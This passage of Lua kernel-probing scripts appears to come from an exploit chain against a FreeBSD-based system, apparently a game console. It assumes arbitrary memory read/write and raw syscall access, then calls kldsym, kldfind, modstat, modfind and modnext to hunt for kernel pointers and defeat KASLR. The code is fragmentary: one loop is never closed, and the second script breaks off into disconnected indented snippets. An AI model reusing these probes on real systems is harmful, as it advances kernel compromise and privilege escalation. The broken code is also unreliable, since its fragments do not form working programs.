-- +0x18: symsize (size_t, 8 bytes)
safe_wd(sym_buf, 0x20)              -- version = sizeof
safe_wq(sym_buf + 8, uint64(name_buf))
safe_wq(sym_buf + 0x10, uint64(0))
safe_wq(sym_buf + 0x18, uint64(0))

local ok, ret = pcall(function()
    return sc_kldsym(uint64(0), uint64(1), uint64(sym_buf))
end)
local rv = ok and to_num(ret) or -999
print(string.format("  kldsym(0, LOOKUP, 'printf'): ret=%d", rv))
if rv == 0 then
    local val = safe_rq(sym_buf + 0x10)
    local sz = safe_rq(sym_buf + 0x18)
    print("  symvalue: " .. hexval(val))
    print("  symsize: " .. hexval(sz))
end

-- [E] kldfind — sys 306
-- int kldfind(const char *file)
print("")
print("[E] kldfind (sys 306)")
local sc_kldfind = make_syscall(306)
-- "kernel\0"
safe_wd(name_buf, 0x6E72656B)  -- kern
safe_wd(name_buf + 4, 0x00006C65)  -- el\0
local ok2, ret2 = pcall(function()
    return sc_kldfind(uint64(name_buf))
end)
local rv2 = ok2 and to_num(ret2) or -999
print(string.format("  kldfind('kernel'): ret=%d", rv2))

-- [F] modstat — sys 301
-- int modstat(int modid, struct module_stat *stat)
print("")
print("[F] modstat (sys 301)")
local sc_modstat = make_syscall(301)
local mstat_buf = memory.alloc(0x200)
for mid = 1, 5 do
    for i = 0, 0x7F do safe_wd(mstat_buf + i*4, 0) end
    safe_wd(mstat_buf, 0x100)  -- version
    local ok3, ret3 = pcall(function()
        return sc_modstat(uint64(mid), uint64(mstat_buf))
    end)
    local rv3 = ok3 and to_num(ret3) or -999
    print(string.format("  modstat(%d): ret=%d", mid, rv3))
    if rv3 == 0 then
        local ver = safe_rd(mstat_buf) or 0
        print(string.format("    version: %d", ver))
        -- Dump first 64 bytes
        for off = 0, 56, 8 do
            local q = safe_rq(mstat_buf + off)
            print(string.format("    +0x%02X: %s", off, hexval(q)))
        end
    end
end

-- [G] modfind — sys 300
print("")
print("[G] modfind (sys 300)")
local sc_modfind = make_syscall(300)
safe_wd(name_buf, 0x6E72656B)  -- kern
safe_wd(name_buf + 4, 0x00006C65)  -- el\0
local ok4, ret4 = pcall(function()
    return sc_modfind(uint64(name_buf))
end)
local rv4 = ok4 and to_num(ret4) or -999
print(string.format("  modfind('kernel'): ret=%d", rv4))

-- Try "linker"
safe_wd(name_buf, 0x6B6E696C)  -- link
safe_wd(name_buf + 4, 0x00007265)  -- er\0
ok4, ret4 = pcall(function()
    return sc_modfind(uint64(name_buf))
end)
rv4 = ok4 and to_num(ret4) or -999
print(string.format("  modfind('linker'): ret=%d", rv4))

-- [H] modnext — sys 302
print("")
print("[H] modnext (sys 302)")
local sc_modnext = make_syscall(302)
local mod_id = 0
for attempt = 1, 10 do
    local ok5, ret5 = pcall(function()
        return sc_modnext(uint64(mod_id))
    end)
    local rv5 = ok5 and to_num(ret5) or -999
    print(string.format("  modnext(%d) = %d", mod_id, rv5))
    if rv5 <= 0 or rv5 == mod_id then break end

print("")
print("=== PROBE 56k4 COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE

print("=== PROBE 56k5: MODSYS KASLR ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

    for i = 1, #nm do

        local cur = safe_rd(name_buf + (off - off%4)) or 0
        local shift = (off % 4) * 8
        cur = cur + nm:byte(i) * (2^shift)
        safe_wd(name_buf + (off - off%4), cur)

--   struct module_stat *next; ... data ... }

                print(string.format("    +0x%02X: %s%s", off, hexval(q),
                    (h >= 0xFFFF8000) and " *** KERNEL PTR ***" or ""))

        for _, vsz in ipairs({0x100, 0x40, 0x30, 0x20}) do
```
